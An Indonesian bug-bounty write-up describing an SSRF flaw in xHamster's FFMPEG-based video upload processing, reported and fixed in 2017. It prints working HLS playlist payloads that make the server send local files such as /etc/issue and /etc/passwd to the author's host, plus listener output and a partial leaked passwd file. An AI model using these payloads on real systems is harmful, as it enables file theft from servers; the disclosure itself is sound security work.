---
layout: post
title: XHamster SSRF Vulnerabillity
date: 2017-08-18 11:55:10 AM
permalink: 2017-08-18-xhamster-ssrf-vulnerabillity/
author: xhellc0de
category: pentesting
---
![Image of XHamster](http://logolist.ru/uploads/posts/2016-04/0_xhamster_logo.jpg)

XHamster merupakan situs streaming video dewasa yang cukup besar. Konten-konten **menarik** pada situs tersebut merupakan kontribusi dari para member XHamster, dengan kata lain, para member *meng-upload* video mereka ke situs tersebut. Bagi para *Bounty Hunter*, fitur *upload* terlihat seperti tambang emas yang siap untuk digali :) Maka dari itu, kami pun tertarik untuk mencoba mencari celah keamanan pada situs XHamster.

Seperti pada situs streaming lainnya, setiap video yang *diupload*, kemungkinan besar *di-encode* terlebih dahulu sebelum kemudian disajikan ke pengunjung. Kebanyakan situs video streaming menggunakan **FFMPEG** untuk *encoding* video pada situs mereka. Maka kami mencoba apakah benar XHamster menggunakan FFMPEG, dan apakah terdapat celah disana.

Pertama kami melakukan pengetesan sederhana dengan mengupload sebuah file video yang telah disisipi *payload* berikut:
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0,
http://noobsec.org:1337/tes_ssrf
#EXT-X-ENDLIST
```

Setelah itu, *listen* di *server* pada port 1337, dan benar kami muncul *response* dari server XHamster:
```
[xhellc0de@noobsec.org ~]# nc -lv 1337
Connection from 88.208.16.193 port 1337 [tcp/menandmice-dns] accepted
GET /tes_ssrf HTTP/1.1
User-Agent: Lavf/56.x.x
Accept: */*
Connection: close
Host: noobsec.org:1337
Icy-MetaData: 1
```

Melihat dari *response* tersebut, maka kami berasumsi bahwa FFMPEG yang digunakan kemungkinan memiliki celah. Maka kami melanjutkan penetrasi lebih dalam untuk mencoba melihat *file* yang ada di server.

Kami sedikit memodifikasi file video yang akan diupload dan membuat 1 file baru dengan nama **header.m3u8**, dengan isi:

ssrf.avi
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0,
concat:http://noobsec.org:1337/header.m3u8|file:///etc/issue
#EXT-X-ENDLIST
```

header.m3u8	
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:,
http://noobsec.org:1337/ssrf_result?
```

Setelah diupload, dan kembali melakukan listen di server, maka muncul *response* seperti berikut:
```
[xhellc0de@noobsec.org ~]# nc -lv 1337
Connection from 88.208.16.193 port 1337 [tcp/menandmice-dns] accepted
GET /ssrf_result?Debian+GNU/Linux+8+\n+\l HTTP/1.1
User-Agent: Lavf/56.x.x
Accept: */*
Connection: close
Host: noobsec.org:1337
Icy-MetaData: 1
```

Dapat dilihat bahwa isi dari *file* /etc/issue adalah: **Debian GNU/Linux 8 \n \l**

Untuk bukti yang lebih kuat, maka kami mencoba untuk melihat file lain yang ada di server XHamster. Dengan sedikit modifikasi pada payload, kami berhasil mengambil isi file /etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
[ redacted ]
messagebus:x:104:107::/var/run/dbus:/bin/false
www:x:999:999::/home/www:/bin/sh
xhamster:x:998:998::/home/xhamster:/bin/sh
[ redacted ]
```

Kami mencoba untuk mengambil isi file-file lain seperti 000-default.conf dan file default lainnya, namun sepertinya XHamster tidak menggunakan default settings, dan kami kesulitan untuk menebak path dari file yang ada pada server mereka.

Untuk itu, kami rasa cukup sejauh ini penetrasi yang dilakukan dan kami langsung menghubungi XHamster terkait isu tersebut.

Timeline:
```
15 Agustus 2017 14:00 : Celah keamanan ditemukan
15 Agustus 2017 15:30 : Celah keamanan dilaporkan ke XHamster
15 Agustus 2017 16:15 : XHamster mengkonfirmasi bahwa celah keamanan tersebut valid
15 Agustus 2017 16:53 : XHamster menyatakan sedang melakukan perbaikan pada celah tersebut
15 Agustus 2017 21:40 : XHamster memberikan reward atas celah yang ditemukan
17 Agustus 2017 10:59 : Celah telah diperbaiki
```
Referensi: https://www.blackhat.com/docs/us-16/materials/us-16-Ermishkin-Viral-Video-Exploiting-Ssrf-In-Video-Converters.pdf
